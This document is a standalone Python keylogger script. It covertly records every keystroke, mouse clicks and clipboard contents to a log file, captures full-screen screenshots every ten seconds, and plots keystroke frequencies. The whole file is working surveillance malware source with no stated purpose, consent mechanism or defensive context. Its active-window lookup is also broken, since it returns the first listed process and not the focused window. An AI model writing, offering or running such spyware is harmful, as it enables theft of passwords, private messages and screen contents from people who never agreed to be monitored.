import os
import time
from datetime import datetime
from pynput.keyboard import Listener, Key
from pynput.mouse import Listener as MouseListener
import psutil
from PIL import ImageGrab
import pyperclip
import pandas as pd
import matplotlib.pyplot as plt

log_file = "keylog.txt"
screenshot_dir = "screenshots"

# Ensure the screenshots directory exists
if not os.path.exists(screenshot_dir):
    os.makedirs(screenshot_dir)

# Function to get the name of the active application
def get_active_window():
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name']:
            return process.info['name']
    return "Unknown Application"

# Function to handle key press events
def on_press(key):
    try:
        active_window = get_active_window()
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - {active_window} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - {active_window} - {str(key)}\n")

# Function to handle key release events
def on_release(key):
    if key == Key.esc:
        return False

# Function to handle mouse click events
def on_click(x, y, button, pressed):
    with open(log_file, "a") as f:
        action = "Pressed" if pressed else "Released"
        f.write(f"{datetime.now()} - Mouse {action} at ({x}, {y})\n")

# Function to log clipboard content
def log_clipboard():
    with open(log_file, "a") as f:
        f.write(f"{datetime.now()} - Clipboard content: {pyperclip.paste()}\n")

# Function to take a screenshot
def capture_screenshot():
    screenshot = ImageGrab.grab()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    screenshot.save(os.path.join(screenshot_dir, f"screenshot_{timestamp}.png"))

# Periodic backup of logs, clearing them when they exceed a specific size
def check_log_size(max_size=1024*1024):  # 1 MB limit
    if os.path.getsize(log_file) > max_size:
        os.remove(log_file)  # Delete log file to reset size

# Analyze keystrokes and plot the frequency of key presses
def analyze_keystrokes():
    data = pd.read_csv(log_file, delimiter=" - ", header=None, on_bad_lines='skip')
    data[0] = pd.to_datetime(data[0])  # Convert timestamp to datetime
    data[2].value_counts().plot(kind='bar')
    plt.title("Keystroke Frequency")
    plt.xlabel("Keys")
    plt.ylabel("Frequency")
    plt.show()

# Setting up keyboard and mouse listeners
keyboard_listener = Listener(on_press=on_press, on_release=on_release)
mouse_listener = MouseListener(on_click=on_click)

# Start the listeners
keyboard_listener.start()
mouse_listener.start()

# Main loop for additional periodic tasks
try:
    while True:
        time.sleep(10)  # Run tasks every 10 seconds
        capture_screenshot()  # Take a screenshot
        log_clipboard()  # Log clipboard content
        check_log_size()  # Check log size and reset if needed
except KeyboardInterrupt:
    keyboard_listener.stop()
    mouse_listener.stop()
